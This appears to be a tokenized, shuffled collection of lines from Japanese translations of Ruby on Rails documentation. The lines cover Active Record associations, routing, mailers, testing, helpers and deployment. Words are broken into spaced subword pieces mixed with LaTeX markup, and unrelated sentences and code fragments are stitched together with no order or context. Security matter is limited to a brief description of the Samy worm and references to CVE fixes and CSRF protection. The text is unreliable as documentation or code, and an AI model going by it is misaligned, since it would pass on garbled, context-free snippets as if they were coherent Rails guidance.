▁` - n ` オプション を指定すると 、 ファイル 全体 ではなく 指定した 単 一 の メソッド だけ を実行します 。
▁` Array ` の拡張
▁#### ▁` Time ▖ current `
▁ 例 :
▁\ emph { Architectur al ▁Style s ▁and ▁the ▁De sign ▁of ▁ Net work - base d ▁ Software ▁ Architectur es } ▖
▁self ▖ author ▁= ▁User ▖ find _ or _ create _ by ( name : ▁author _ name )
▁{0}{1} 第 10 章 {/1}{/0} では 、 ▁ メールアドレスが \ emph { 本当に } 有効 であること を確かめるため に 、\ emph { アカウントを有効化する } 機能を サインアップ の 手順 に追加します 。
▁ カラム を このように 名 付ける ことによって 、 Active ▁Record で User オブジェクトの 属性を 利用 できるようになります 。
▁ JS - ERb ファイルの 内部で は 、 Rails が自動的に \ href { http :// jquery ▖ com /}{ jQuery } ▁JavaScript ヘルパー を提供します ▟ これにより 、\ href { http :// www ▖ w 3 ▖ org / DOM /}{ DOM ▁( Document ▁Object ▁Model )} ▁ を使用して ページを 操作 できます 。
▁なお 、 以前の バージョンの Rails では \ text tt { PATCH } ではなく \ text tt { PUT } が使用され ていました ▟ PUT は Rails ▁4▖0 でも 依 然 サポート されて は います が 、\ text tt { PATCH } の方が \ href { http :// web log ▖ rubyonrails ▖ org / 20 12 / 2 / 25 / ed ge - rails - patch - is - the - new - primary - http - method - for - update s /}{ 意図 した HTTP の使用 法 により 適 している } ので 、 新しい アプリケーションでは PATCH が 推 奨 されています 。
▁たとえば 、 わざと 無効な 情報を 入力 して 送信 して エラーメッセージ を 表示 してから 、 Home ページ をクリックして 移動 すると 、 そこで も フラッシュメッセージ が表示され た まま になっています ▁( 図 \ ref { fig : flash _ persistence }) 。
▁ 原 因 は 、 edit アクション や update アクション で ログインを要求 する ようになった ため 、 ログイン していない ユーザー だと これらの テストが 失敗する ようになった ためです 。
▁ 恐 ろ しく 大きな アップロード 画像
▁ 数値 を 通 貨 表示 に変換 します ▁( $ 1 3 ▖ 6 5 など ) 。
▁ ╼ ▁* = ▁require _ self
▁`: inverse _ of ` オプションは 、 その 関連付けの 逆 関連付け となる ` belongs _ to ` 関連付け の名前 を指定します 。
▁\ k ode { User ▖ new } を 引数 なしで 呼 んだ 場合は 、 すべての 属性 が \ k ode { nil } の オブジェクトを返します 。
▁# ▁def ▁debug ?
▁` orders _ count ` を 指定 しない で 新しい ` Client ` モデル を作成 しようとすると 、 レコード は 無効 になって 例外が発生します 。
▁ 本書 で カ バー する 基本的な 概念 については 既に 知 っている と思います が 、 テスト駆動開発 や REST 構造 などの 概念 については 馴染 み がない 方 も い る でしょう 。
▁\ k ode { rake ▁test } コマンドは 、 テストを する 度 に コマンドライン に移動し て 手動で コマンドを実行 し なければならない 点が 面倒 です 。
▁ エラーメッセージ をテストする ための テンプレート
▁Rails の 慣例 では 、 相手 の モデル を指す 外部キー を保持し ている 結合テーブル 上の カラム名 については 、 その モデル名 に サ フ ィ ッ ク ス ▁` _ id ` ▁ を追加した 関連付け 名 が 使用される ことを 前提と します 。
▁ あるいは 、` raw ` と 同等の ` <%= = ` を使用します 。
▁ years _ since
▁この 追加 の 節 は 、\ href { http :// www ▖ railstutorial ▖ org /}{ Ruby ▁on ▁Rails チュートリアル スクリーンキャスト シ リ ー ズ } ▁( 原 著者 の 主 催 する 有 料 スクリーンキャスト : ▁ 英語 のみ ) ▁ で使用する テスト 用 設定 について解説します 。
▁class ▁Co nt in ent ▁< ▁ActiveRecord :: Base
▁` video _ tag ` ヘルパーは 、 指定された ファイル を指す HTML ▁5 ▁`< video >` タグ を生成します 。
▁Ke y ▁: success ▁has ▁value ▁" It ▁work ed !"
▁" User "▖ foreign _ key ▁# ▁=> ▁" user _ id "
▁この ` to _ s ` メソッドは 、` to _ formatted _ s ` メソッド の別名 です 。
▁" hello "▖ from (2) ▁# ▁=> ▁" ll o "
▁ 本ガイド のコード 例 では 、 基本的に 以下の モデル を使用します 。
▁ これはリスト \ ref { code : find _ authenticate _ user } で使用されていました 。
▁{0} 図 7 ▖ 11 {/0} {1} ユーザー登録 ページのモックアップ ▟\ href { http :// railstutorial ▖ org / images / figures / signup _ mockup _ bootstrap - full ▖ png }{( 拡大 ) }{/1}
▁ ユーザーが 新しい 登録 を 完了 するためには 必ず アカウントの有効化 が必要になる のです から 、 有効化トークン や 有効化 ダイジェスト は ユーザー オブジェクトが 作成される 前に 作成 しておく必要があります 。
▁< b > Users </ b >
▁Ruby では 組み込み クラス です ら 内部 を見 たり 修正 したり できる
▁* ▁Rails ▁4▖0 では ` ActionDispatch :: Response ` の導入に伴い ` ActionController :: Response ` が 非推奨 となり ました 。
▁> > ▁Rails ▖ env ▖ development ?
▁` beginning _ of _ year ` メソッドと ` end _ of _ year ` メソッドは 、 その 年 の最初の 日 と 最後の 日 をそれぞれ 返します 。
▁> > ▁p ▁= ▁Person ▖ new
▁new で 既に 行った の と 同じ要領で 、` app / controllers / articles _ controller ▖ rb ` に ` show ` アクション を追加し 、 対応する ビュー も 追加 する必要があります 。
▁ カスタマイズ した \ k ode { Guardfile } ▖
▁`: host ` オプションを グローバル に設定し ていない 場合は 、 " * _ url " ▁ ヘルパー に `: host ` オプション を明示的に 渡す 必要がある ことにご注意ください 。
▁ここで の 原 則 は 、「 コントローラのアクション の 最 終 部分 で 明 示 的な 画面 出力 が 指示 されていない 場合は 、 コントローラ が 使用できる ビューの パス から ` アクション 名 ▖ html ▖ erb ` という ビューテンプレート を探し 、 それ を使用して 自動的に 出力する 」 という ものです 。
▁ 例外 発生 部分 を削除する
▁enable _ start t l s _ auto : ▁true ▁ }
▁ 説明 の リスト
▁ 実 質 的に 空 になっている デフォルトの User ▁ spec 。
▁ したがって 、 Users コントローラの テスト ▁( リスト \ ref { code : edit _ update _ redirect _ tests }) ▁ を 補 完 する ように 、 テスト を追加する ところから始め ていきます 。
▁* ▁ アセットパイプライン に プリプロセッサ を追加する
▁< td > <%= ▁link _ to ▁" Show ", ▁book ▁%></ td >
▁has _ many ▁: account s
▁7 ▖ to _ param ▁# ▁=> ▁"7"
▁$ ▁bin / rails ▁generate ▁job ▁ guest s _ cleanup
▁ ステータスフィード の パーシャル は 、 Micropost の パーシャル ▁( リスト \ ref { code : micropost _ partial }) ▁ とは 異 な っ ている点に注目してください 。
▁ このコード では \ k ode { let } メソッド の代わりに \ k ode { let !} ▁( “ let ▁ バ ン ” と 読み ます ) ▁ メソッド を使っています ▟ その 理由は 、\ k ode { let } 変数 は \ emph { lazy } 、 つまり 参 照 された ときに はじめ て 初期化 される ためです 。
▁{0}{1} リスト 3▖2 8 {/1}{/0} は 、\ emph { ERB } と呼ばれ ている 、 Ruby の 埋め込み コード の最初の 例 です
▁ ユーザーが 記 憶 される には ログイン が必要です ▟ そこで 、 テスト 内で ユーザーがログイン できるように するための ヘルパーメソッド を 定義 することから始め ます 。
▁NOTE : ▁ 定義ファイル の場所は ` active _ support / core _ ext / object / i nclusion ▖ rb ` です 。
▁変更の結果 を リスト \ ref { code : edit _ update _ redirect _ tests } に示します 。
▁define _ method ( method _ name , ▁& block )
▁-- ▁create _ table (: articles )
▁ その後 、 その リソース に対応する 行 が ` config / routes ▖ rb ` ファイルに 挿入され 、 エンジン で 使用されます 。
▁( 2 ** 10 2 4 )▖ clone ▁# ▁=> ▁all o cat or ▁undefined ▁for ▁B ig n um
▁ 気 になる 方 への 補 足 : ▁find を使用する場合 は以下のようになります 。
▁#### ▁` prepend `
▁ キュー への ジョブ 登録 は以下のように 行います 。
▁ メイラー も コントローラの ビュー と 同様の方法で レイアウト を 設定 できます 。
▁belongs _ to ▁: author , ▁class _ name : ▁Blorgh ▖ author _ class ▖ to _ s
▁これは 、 データベースの 世界 では \ emph { 全 表 ス キャン } として 知 ら れ ており 、 数 千 の ユーザーが い る 実際の サイト では \ href { http :// cat b ▖ org / j argon / html / B / B ad - Thin g ▖ html } { 極めて 不 都 合 } です 。
▁\ k ode {@ users } 変数 に ユーザー 一覧 が保存され ると 、 コントローラは リスト \ ref { code : demo _ index _ view } の ▁\ emph { ビュー } ▁ を呼び出します ▁( 6 ) 。
▁以上で お しま い です 。
▁ 今回の 記事 と コメント という モデル の場合 、 以下 のいずれか の 方法で 関連付けを 設定 できます 。
▁#### ▁javascript _ include _ tag
▁それでは 、 まず \ k ode { rails ▁console } コマンドを実行 して セッション を開始 し 、 次に 有効な 名前 ・ メールアドレス ・ パスワード ・ パスワード 確 認 を渡して ユーザーを 作成 してみましょう 。
▁ 奇 妙 な ことに 、\ k ode { destroy } は \ k ode { create } と同じように そのオブジェクト 自身 を返します が 、 その 返 り 値 を使用して も 、 もう一度 \ k ode { destroy } を呼ぶ ことはできません 。
▁リスト \ ref { code : users _ resource } の Users リソース が提供する RESTful な ルート
▁ え っ ? !
▁Rails ▁4 で ` PUT ` リクエストを ` / users / : id ` に 送信する と 、 従来 と同様 ` update ` に ルーティング されます 。
▁ ユーザーが リダイレクト された 後で 、 アプリケーションが この id で リレーションシップ を 取り出す ので 、 このコード は 動作します 。
▁it ▖ ╼╼ ▁\ subsection { 開発環境 } ╼ ▁\ label { sec : development _ environment }╼╼
▁` form _ for ` の場合と同様 、 同じ Ajax イベント を バ イン ド できます 。
▁ セッション は Active ▁Record オブジェクト では ないので 、 上の ように Active ▁Record が よ し な に エラーメッセージ を表示し てくれる ということは 期 待 できません ▟ そこで 、 ここでは フラッシュメッセージ で エラー を表示します 。
▁* ▁Rack の ミドルウェア を Rails で 使う 方法
▁2 番目 の例では 2 つ目の Location ヘッダー フィールド が 1 つ目の もの を上書き する ため 、 以下のような HTTP ヘッダー が生成されます 。
▁$ ▁ echo ▁" + : to _ param + " ▁| ▁ rdoc ▁-- p ip e
▁### ▁ サブクラス と 子 孫
▁Git に 取り 込 み たくない ファイル を指定する ための パターン
▁以下の メソッドが 用意されています 。
▁続いて 、 自分の システム に Heroku コマンドライン クライアント が インストール されている かどうかを確認 します 。
▁ 最新の S ublime ▁Text は 、 新 し もの 好 き の方 以外に は お勧め しません 。
▁ メイラー のテスト と 統合テスト は 、 どちらも User メイラー の 振 舞 い を確認する の に 有 用 。
▁ 後 者 を指定すると 、 冒 頭 が 小文字 になります 。
▁なお 、 同じ カテゴリ ー に 複数の 記事 がある場合 、 カテゴリ ー が 重複 します 。
▁ SELECT ▁* ▁FROM ▁clients ▁OR DER ▁BY ▁clients ▖ id ▁DESC ▁LIMIT ▁3
▁ 以下のように すると 、 特定の キュー に対して ジョブ を 1 つ 作成 できます 。
▁invoke ▁ erb
▁ サインイン に 成功 後 表示される ユーザー ・ プロファイル のモックアップ ▟ ▁\ href { http :// railstutorial ▖ org / images / figures / signin _ success _ mockup _ bootstrap - full ▖ png }{( 拡大 表示 )}
▁# ▁=> ▁Sun , ▁29 ▁Mar ▁2010
▁* ▁` config ▖ filter _ parameters ` は 、 パスワード や ク レ ジ ッ ト カ ー ド 番号 など 、 ログ に 出力 し たくない パラメータを フィルタ で 除 外 するために 使用します 。
▁このオプション は 次のような 場合に 便利です ▟ アセットパイプライン を使用し ない 既存の プロジェクト があり 、 その プロジェクト の 既存の パス を 指定 したり 、 別 途 新しい リソース 用の パス を 指定 したり する 場合 なのです 。
▁create ▁app / assets / stylesheets / users ▖ css ▖ scss
▁production モード の場合 、 この コールバック は 最初の リクエスト で のみ 実行されます 。
▁ これはリスト \ ref { code : relationships _ controller _ spec _ ajax } で使用されていました 。
▁たとえば 、` config / application ▖ rb ` ファイル には 以下の 設定 が含まれています 。
▁### ▁ プ リ プロセス
▁作成した 関連付け にも より ますが 、 具体的には 次の 2 つの 作業 が必要 になります 。
▁続いて ` bundle ` コマンドを実行 し 、 gem をインストール します 。
▁ これはリスト \ ref { code : password _ reset _ mailer _ test } で使用されていました 。
▁cookie セッション スト ア を使用する場合 、` session ` や ` flash ` ハッシュ についても この ことは 該 当 します 。
▁def ▁to _ param
▁< td > <%= ▁book ▖ title ▁%></ td >
▁javascript _ path ▁" common " ▁# ▁=> ▁ / assets / common ▖ js
▁ 指定 の 属性 に関する すべての エラーメッセージ の 文字列 の配列 を返します ▟ 1 つの 文字列 が 1 つの エラーメッセージ です 。
▁このとき IT U は 、 混 乱 を 最小限 にとどめ るために 、 略 称 を 1 つだけ に したい と 考え ました 。
▁#### ▁form _ for
▁このメソッド で使用される 文法 は 、` ActiveRecord :: Base ▖ find ` で使用されている もの と同じ です 。
▁ 一般に 、 Rails の設定 作業 とは Rails 自身 を設定する ことで も ある と 同時に 、 Rails の コンポーネント を設定する ことで もあります 。
▁match ▁' / ' ▁=> ▁' root # index '
▁もちろん 、 以下のように リンク を直接 記 述 することもできます 。
▁My app :: Application ▖ config ▖ secret _ key _ base ▁= ▁' new ▁secret ▁key ▁base '
▁# ▁=> ▁{" A " =>2}
▁self を省略した 結果を リスト \ ref { code : layout _ login _ logout _ links } に示します 。
▁where ( published : ▁true )
▁t ▖ string ▁: account _ number
▁上の 拡張子 の場合は 、 CoffeeScript と ERb の両方 で 実行されます ▁( コードは 右 から 左 へ と 実行されます ので 、 こ の例では CoffeeScript が 最初に 実行されます ) 。
▁ 同じ マシン 上で 異なる バージョンの Ruby や Rails を実行し たい場合 、 これは 特に 重要です 。
▁ http :// www ▖ example ▖ com / account _ activations / q 5 lt 38 h Q D c _ 9 59 P V oo 6 b 7 A / edit
▁{0} 図 7 ▖9{/0} {1} ユーザー表示ページ \ href { http :// localhost :3000/ users /1}{/ users /1 } に サイドバー と CSS を追加する ▟\ href { http :// railstutorial ▖ org / images / figures / user _ show _ sidebar _ css _ bootstrap - full ▖ png }{( 拡大 ) }{/1}
▁| ▁| ▁40 2 ▁| ▁: p a y ment _ require d ▁|
▁ 特 徴 :
▁* ▁ 制限 追加 や Rack エ ンド ポイント などの 高度な 手法
▁\ k ode { name } 属性 の検証 には 、 空 文字 でない 、 名前 が 51 文字 未 満 である という 最小限 の 制 約 しか 与 え て いません でした ▟\ k ode { email } 属性 の場合は 、 もっと 厳 重 な 要求 を 満 た さ なければなりません 。
▁### ▁ ルーティング の作成 を 制限 する
▁Rails には 初期化 コードの 置き場所 が 4 箇所 あります 。
▁<%= ▁link _ to ▁" Blog ▁articles ", ▁ blorgh ▖ articles _ path ▁%>
▁#### ▁form _ tag
▁` require _ tree ` ディレクティブ を使用すると 、 これらの ファイルを 即座に アプリケーション から 利用できます 。
▁置き換えた結果を {0}{1} リスト 4 ▖3{/1}{/0} に示します 。
▁たとえば 、\ ref { sec : render ing _ with _ a _ flash _ message } では \ k ode { flash [: error ]} を使用して ログイン に 失敗した こと を表す メッセージ を表示します
▁Home ページ で 動作する ステータスフィード ▟\ href { http :// railstutorial ▖ org / images / figures / home _ page _ with _ feed _ bootstrap - full ▖ png }{( 拡大 )}
▁( Linux 用の GitHub は 今 の ところ Git しか ない よう です ) 。
▁# ▁Un comment ▁this ▁line ▁on ▁OS ▁X ▖
▁# ▁== ▁ Mo c k ▁ Frame work
▁Rails では 、 ある ページ から 別の ページに 移動 するときに 状態 を 保 持 することができます ▟ ページ の状態 の 保存 には 、 一時 cookies と 永 続 cookies のどちら も使用できます 。
▁この マジックカラム は Rails によって自動的に 更新 される ため 、 基本的に は 手動で 更新 することは できない のですが 、 fixture ファイル の中で は それが 可能 になっています 。
▁リスト \ ref { code : layout _ links _ test } では 、\ k ode { assert \_ select } メソッドの 高度な オプション を使っています ▁( このメソッド 自体 は リスト \ ref { code : title _ tests } や リスト \ ref { code : contact _ page _ test } でも 登 場 しました ) 。
▁#### # ▁` readonly `
▁図 { p 0} のモックアップ で示した ような 、 ユーザー 自身 の ポスト を含む マイクロポストの {2} フィード {/2} がない と 不 便 です
▁そこで 、 コントローラで 渡される パラメータ は ホワイトリスト で チェック し 、 不 正 な マスアサインメント を 防止 する 必要がある のです 。
▁def ▁ foo ╼ ▁do _ stuff ╼ ▁boolean ? ▁?
▁ lib / assets / javascripts / m oo v in at or ▖ js
▁The ▁association ▁between ▁microposts ▁and ▁users ▖
▁\ href { http :// localhost :3000/ microposts / new }{/ microposts / new } ページ をブラウザで開き 、 新しいマイクロポスト の 情報を 入力 して マイクロポスト をいくつか 作成 してみましょう ▁( 図 \ ref { fig : demo _ new _ micropost }) 。
▁<%= ▁text _ field ▁: person , ▁: email ▁%>
▁という の も 、\ ref { sec : requiring _ logged _ in _ users } では 、 before フィルター の \ k ode { logged \_ in \_ user } メソッドを使って 、 ログインを要求 した こと について 思い 出 してください ▁( リスト \ ref { code : authorize _ before _ filter }) 。
▁Call ing ▁` p r o t ec t _ from _ forgery ` を呼び出す と 、 デフォルトで `: authenticity _ token ` が設定され ます 。
▁ 利用 可能な すべての メソッド については 、` ActiveModel :: Error s ` ドキュメント を参照してください 。
▁Active ▁Record は 条件 値 の最初の 要素 を調べ 、 その後 に 要素 が追加され ていた ら 、 最初の 要素 の中に ある 疑問符 ` ( ? ) ` を追加 要素 で 置き換え ます 。
▁subject : ▁email ▖ subject ,
▁#### ▁ バックポート
▁* ▁` config ▖ assets ▖ logger ` は ロガー を引数に取り ます ▟ この ロガー は 、 Log 4 の インターフェイス か 、 Ruby の ` Logger ` クラス に従い ます 。
▁ より 読みやすく した リスト \ ref { code : layout _ flash _ content _ tag } のコード に対して テストスイート を実行し 、 こちら も 正常に 動作する ことを確認してください ▟ このコード では 、 Rails の \ k ode { content \_ tag } ヘルパー を使用しています 。
▁Contact ▁Ruby ▁on ▁Rails ▁Tutorial ▁about ▁the ▁sample ▁app ▁at ▁the
▁たとえば 、 ローカル変数 名を ` product ` ではなく ` item ` に したい のであれば 、 以下のように します 。
▁# ▁=> ▁ Blog : ▁ Visit ▖
▁\ href { http :// col le ge ▖ h ar var d ▖ ed u /}{ ハ ー バー ド 大 学 } 卒 業 後 、\ href { http :// re s ol ve r ▖ c al tech ▖ ed u / C al tech E T D : e td - 05 22 200 3- 16 16 2 6 } { カ リ フ ォ ル ニ ア 工 科 大 学 } で \ href { http :// www ▖ c al tech ▖ ed u /}{ 物 理 学 博 士 号 } を取得し 、 起 業 プログラム ▁\ href { http :// y com bin at or ▖ com /}{ Y ▁Co mb in at or } ▁ の 卒 業 生 で もあります 。
▁d ▁+ ▁1▖ year
▁しかし 、 複雑な 変更 を行って い た場合 や 、 master と 対象 ブランチ の 差 が 甚 だ しく な っている 場合は 、 もう少し 手 を加える 必要がある かもしれません 。
▁`: skip _ type s ` オプション が true でない ▁( または `: skip _ type s ` オプション がない ) ▁ 場合 、 以下のような マッピング で " type " 属性 も 追加 されます 。
▁第 3 引数 は オプション ハッシュ で 、 この場合は サンプル アプリ のリンク で CSS の id ▁\ k ode { logo } を指定して います
▁User モデルオブジェクト を シ ミ ュ レ ート するための ファクトリー 。
▁<%= ▁f ▖ submit ▁%>
▁ユーザー 数 が 膨 大 になる と \ k ode { find \_ by } では 検索 効率 が 低 下 する のではないかと 心 配 する 方 も い る かもしれませんが 、 あ せる 必要はありません ▟ この問題 および データベースの インデックス を使った 解決策 については \ ref { sec : uniqueness _ validation } で 扱 います 。
▁ /* ▁▖▖▖
▁ /* ▁ universal ▁* /
▁* ▁modify - README
▁ 上で 述べたように 、\ k ode { git ▁branch ▁- D } で トピックブランチ 上の 変更 を破棄する こともできます 。
▁ mv ▁< 移動 元 / 現在の 名前 > ▁< 移動 先 / 変更 後 の名前 >
▁C A UT ION : ▁ データベース上の オブジェクト の状態 を 変 え る 方法は 1 つ とは限りません 。
▁ ActiveSupport ▖ on _ load (: active _ record ) ▁do
▁リスト \ ref { code : test _ helper _ application _ helper } で お 見 せ した ように 、 Application ヘルパー で 使 っている \ k ode { full \_ title } ▁ ヘルパー を 、 test 環境で も 使えるように すると 便利です 。
▁` find _ or _ create _ by ` および ` find _ or _ create _ by !` メソッド を使用すれば これら を 一度 に 行なうことができます 。
▁render ▁' new '
▁` descendants ` メソッドは 、 その レシーバ より 下 位 にある すべての クラス を返します 。
▁` ActionMailer :: Message Delivery ` オブジェクトは 、` Mail :: Message ` を ラ ッ プ しています 。
▁たとえば 、` ActionController :: Http Authentication :: Token :: Controller Methods ` にある 以下の メソッドでは ` blank ?` を使用して トークン が存在し ている かどうかを チェック しています 。
▁ 本ガイド で 後 述 する ように 、 アセット ファイルを グループ 化 する方法 は 自由に カスタマイズ できます 。
▁ 今回は ユーザーに ログインを要求 するために 、 リスト { p 0} のように {2} logged _ in _ user {/2} メソッドを 定義 して {2} before _ action ▁: logged _ in _ user {/2} という 形式で 使い ます
▁ このような テスト のおかげで 、 テスト駆動開発 を ベース に 新しい 属性 や メソッドを User モデル に追加する ことができます ▟ さらに 、 すべての \ k ode { User } オブジェクトが これらの メソッド に応答する 必要がある という 仕 様 も ここで 明 ら か になりました 。
▁もちろん そんな ことはありません ▟ 皆さん はこの 章で Rails の コントローラ 、 アクション 、 ビューの 開発 を ひ と とおり 行った ことで 、 これ から 動的な コンテンツ を ど し ど し サイト に追加する ための 準備 が す っかり 整 った のです 。
▁| ▁` { ▁" person " : ▁ null ▁}` ▁| ▁` { ▁: person ▁=> ▁nil ▁}` ▁|
▁ マイクロポスト 用の アクセス制御 テスト 。
▁X ▖ local _ constant s ▁# ▁=> ▁ [: X 1, ▁: X 2, ▁: Y ]
▁` auto _ discover y _ link _ tag ` では 以下の 3 つの タグ オプション が 使用できます 。
▁ u ▁change ▁the ▁email ▁address ▁to ▁one ▁without ▁an ▁ associated ▁Gravatar ? ╼ %= ▁< span ▁class =' exercise ' ▁id =' ex - 05 a a 0 f ' ></ span >╼ \ end { enumerate }╼╼ ▁% ▁subsection ▁ en a b l ing _ edit s ▁( end )╼╼ ▁% ▁section ▁updating _ users ▁( end )╼╼ ▁\ section { 認可 } ▁% ▁( fold )╼ ▁\ label { sec : authorization }╼╼
▁\ ref { sec : requiring _ signed _ in _ users } で 経験 し てきた ように 、 Users コントローラ をテストするために 、 アクション 単 位 で アクセス制御 をテストします 。
▁これで すべての 存在性 が チェック された ので 、 テストスイート は ▁\ passing ▁ するはずです 。
▁{0} 図 2▖ 5 ▁{/0}{1} 新規ユーザー 作成 ページ ▁(\ href { http ://0▖0▖0▖0:3000/ users / new }{/ users / new }) {/1}
▁ プロフィール画面 ▁(\ href { http :// localhost :3000/ users /5}{/ users /5}) ▁ に ▁[ Unfollow ] ▁ボタンが表示されている
▁ 常に 自動化 テスト を使用して 新 機能 開発 を進める ことで 、 自 信 を 持 って リファクタリング できるように なり 、 回 帰 バグ も い ち は や く キャッチ できるように なる 。
▁* ▁` ActionDispatch :: Callbacks ` は 、 リクエスト に応答する 前に 、 事前 コールバック を実行します 。
▁ そのような 式 は 、 レシーバ のコンテキストで 評価 されます 。
▁以上で 、 Rails アプリケーションを 初めて 作る という 試 み は 終わり です ▟ この後 は 自由に 更新 したり 実 験 を 重 ね たり できます 。
▁* ▁`: domain ` ▁- ▁H E LO ドメイン の 指定 が 必要な 場合に 使用します 。
▁今度は 編集 フォーム が動作する ようにしましょう 。
▁# ▁config / initializers / json _ patch ▖ rb ▁ に 以下 を書く
▁ パーシャル 内の ローカル変数 を カスタマイズ したい場合は 、 パーシャル の 呼び出し 時に `: as ` オプション を指定します 。
▁これは 標準的な フォロー に対するテスト では あります が 、 Ajax 版 も や り 方は 大 体 同じです ▟ Ajax の テストでは 、\ k ode { post } の代わりに \ k ode { xhr ▁: post } を使う だけです 。
▁Ruby ▁on ▁Rails は 200 4 年 に デ ビュー して 以 来 、 急 速 に 成 長 して い きました ▟ 現在 では 、 動的な Web アプリケーションを開発する フレームワーク として 、 最も 有 力 かつ 人 気 のある フレームワーク の 1 つ になっています 。
▁ いつものように 、 統合テスト を生成する ところから始め ます 。
▁* ▁`: through `
▁resources ▁: books
▁このガイドでは 、 開発者 に 向 け て Rails のルーティング 機能を 解説します ▁( 訳 注 : ▁route と root を 区別 する ため 、 訳 文 では route を 基本的に 「 ルーティング 」 と 訳 します ) 。
▁ ブラウザで ルート URL 「 / 」( 「 スラッシュ 」 と 読み ます : ▁\ ref { sec : hello _ world } 参 照 ) ▁ を開く と 、 図 \ ref { fig : riding _ rails } と同じ Rails のデフォルト ページ が表示されます が 、 Users リソース を scaffold で生成した ことで 、 ユーザー 管理 用の ページ が 多数 追加 されている 点 が異なります 。
▁( 必要に応じて インデント 付き のコード 例 を追加 できます )
▁== ================
▁上 は ` books / some / section / last - words - a - me m o ir ` にマッチし 、` params [: section ]` には ` ' some / section ' ` が保存され 、` params [: title ]` には ` ' last - words - a - me m o ir ' ` が 保存されます 。
▁この 項 では 、 User と Micropost の 関連付けを 改良 していきます 。
▁また 、 Rails コア チーム は 、 _ ed ge ▁Rails _ ▁( その 時点 で の開発 版 Rails のコード ) ▁ で のテスト に 時間 を 割 い てくれる 方 からの フィードバック を 常に 歓迎 しています 。
▁この `: method ` オプション と `: ' data - con fi rm ' ` オプションは HTML 5 の 属性 です ▟ この リンクをクリックすると 、 本当に 削除 して よい かどうかを確認 する メッセージ を表示し 、 その後 ` delete ` メソッドと リンクを 送信 します 。
▁ 以下のような 定 形 の 手法 を使用することで 、 デフォルト値 を持つ オプション ハッシュ を コンパクト に サポート できます 。
▁* ▁`: two _ words _ connect or `: ▁ 項目 数 が 2 つの 場合 の 接続 詞 を指定します 。
▁new _ password _ reset _ path
▁リスト \ ref { code : user _ profile _ test } では マイクロポストの 投 稿 数 をチェックする ために 、\ k ode { {1} 第 10 章 {/1} } の演習 ( \ ref { cha : account _ activation _ and _ password _ reset }) で紹介した { 4 } response ▖ body {/4} を使っています 。
▁ メール送信 のための Active ▁Mailer アクション や ビューの 生成 機能 が Rails に 備 わ っている 。
▁この 結果 、 一意性 の検証 が 行われている にもかかわらず 、 同じ メールアドレス を持つ 2 つの ユーザー レコード が作成され てしまいます 。
▁Web アプリケーション 用の データモデル を 構 築 する に あ た って 、 個 々 の モデル 間 での \ emph { 関連付け } を 十分 考え ておく こと が重要です 。
▁ 個 人 的に は 、 コ ン セ プ ト を 明 確 にする 意味 と ユーザー登録ページ を ダブルチェック する 意味 も 兼 ね て 、 ▁( 実際の 手順 に 倣 って ) ▁ 両方 の 関数 を呼び出す 方が 好 き です 。
▁これは 控 え め に 言 って も と ても よく ま と ま っています ▁( リスト \ ref { code : raw _ user _ model })
▁</ tr >
▁また 、 Rails の 設計 が 簡潔 で 美 しい ことも 、 Rails の 成功 を 支 え ている 秘 訣 の 1 つ です ▟ これを実現 できた のは 、 Rails の 背 後で 動いている \ href { http :// ruby - lang ▖ org /}{ Ruby } 言語 の 驚 異 的な 柔 軟 性 のおかげで す ▟ 具体的には 、 Web アプリケーションの 作成 に 特 化 した \ href { http :// en ▖ w ikipedia ▖ org / wiki / D o main _ Specific _ Language } { DSL ▁( ドメイン 固 有 言語 )} ▁ を ▁Ruby 言語 で 実装 している ことにより 、 HTML や データモデル の 生成 、 URL ▁ のルーティング など 、 Web プログラミング で 必要な 多くの 作業 が 簡単に なります ▟ その 結果 、 Rails を使用して アプリケーションを開発する と 、 コードが 簡潔 になり 、 読みやすく なります 。
▁ パラメータ
▁\ k ode { self } を明示的に 書く かどうか は 好 み の 問題 です 。
▁create ▁test / fixtures / blorgh / comments ▖ yml
▁ 現 実に は 、 メールアドレス の 大文字 小文字 の 区別 を強制する メール サービス や IS P は め った に 存在しない ▟ メールアドレス の すべての 文字 を 大文字 にする など 、 受 信 者 の メールアドレスが 誤 って 入力 され ていれば 、 メール は 返 送 される だけ だ ▟ 」
▁belongs _ to ▁: manager , ▁class _ name : ▁" Employee "
▁git ▁: in it
▁また 、` deep _ symbolize _ keys ` や ` deep _ symbolize _ keys !` を使用して 、 与えられた ハッシュの すべての キー と 、 その中に ネスト されている すべての ハッシュの キーを シンボル に変換 することもできます 。
▁この ワーム は 、 攻撃者 である Sam y の プロファイル ページ を開く だけで 自動的に Sam y に 友 達 リクエストを送信する という ものです 。
▁これらの 要素を 盛 り 込 んだ StaticPages コントローラ 生成 コマンド と 実行 結果を リスト \ ref { code : generating _ pages } に示します 。
▁ アプリケーションで カスタム 画像 を 扱 った り その他の ファイルを アップロード する必要が あれば 、 代わりに \ href { https :// github ▖ com / thoughtbot / paper c li p } { P a p er c li p } ▁gem か \ href { https :// github ▖ com / j nick la s / carrierwave } { CarrierWave } ▁gem を お勧め します 。
▁some _ code
▁def ▁article _ params
▁ 基本的に は 、 Gemfile で エンジン を指定する 方法は 他の gem の 指定 方法 と 変わりません 。
▁### ▁ 引数 を 渡す
▁$ ▁bundle ▁exec ▁rake ▁test : mailers
▁ 新しい Web サーバ を追加する ために 、\ href { https :// dev center ▖ heroku ▖ com / articles / deploying - rails - application s - with - the - puma - web - server } { Heroku 内の Puma ドキュメント } ▁( 英語 ) ▁ に したがって セットアップ していきます 。
▁ これを パス させるため には 、 長さ を強制する ための 検証 の 引数 を使う 必要があります ▟\ k ode { : maximum } パラメータ と 共 に 用 い られる \ k ode { : length } は 、 長さ の 上 限 を 強 制 します ▁( リスト \ ref { code : length _ validation }) 。
▁最後に 、 作 者 名を 記事 の ページに 表示 しましょう 。
▁( [ CVE - 20 12 - 2 6 60 ]( https :// groups ▖ google ▖ com / forum / # ! search in / rubyonrails - security / deep _ munge / rubyonrails - security / 8 S A - M 3 as 7 A 8 / M r 9 fi 9 X 4 k N g J ), ▁[ CVE - 20 12 - 2 6 9 4 ]( https :// groups ▖ google ▖ com / forum / # ! search in / rubyonrails - security / deep _ munge / rubyonrails - security / j I L Z 34 t A H F 4/ 7 x 0 h L H - o 0 - I J ) ▁ および ▁[ CVE - 2013 - 0 1 55 ]( https :// groups ▖ google ▖ com / forum / # ! search in / rubyonrails - security / CVE - 20 12 - 2 6 60 / rubyonrails - security / c 7 j T - E e N 9 e I / L 0 u 4 e 87 z Y G M J ) ) ▁ の セキュリティ 問題 への 対応 として 、 Rails の動作 を デフォルトで セキュア に するために ` deep _ munge ` メソッドが 導 入 